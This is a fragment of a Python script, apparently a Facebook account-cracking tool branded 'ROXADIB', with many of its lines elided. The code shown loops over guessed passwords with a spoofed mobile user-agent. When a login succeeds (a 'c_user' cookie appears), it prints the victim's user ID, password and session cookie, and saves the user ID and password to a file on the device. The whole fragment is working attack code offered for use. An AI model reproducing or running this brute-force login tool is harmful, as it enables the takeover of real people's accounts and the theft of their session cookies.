...
ha = current.day
today = date.today()
#ROXADIB2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mROXADIB')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-ROXADIB/1.2.0 OPN-B'
...
logo= f"""  \033[1;34m
 ...
 \x1b[1;94m★     \x1b[1;91m[✓] GITHUB       :  \x1b[1;91mZOKER ADIB         \x1b[1;94m★
        ...
        for ps in pwx:
           ...
           'user-agent': ff}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;92m[ROXADIB-OK🌻] '+uid+' | '+ps+'\033[0;97m')
                print(f'{B}[COOKIE🎁] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/ROXADIB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mROXADIB","\x1b[1;92mROXADIB","\x1b[1;93mROXADIB","\x1b[1;94mROXADIB","\x1b[1;95mROXADIB","\x1b[1;96mROXADIB","\x1b[1;97mROXADIB","\x1b[1;91mROXADIB","\x1b[1;92mROXADIB","\x1b[1;93mROXADIB","\x1b[1;94mROXADIB","\x1b[1;95mROXADIB","\x1b[1;96mROXADIB"])
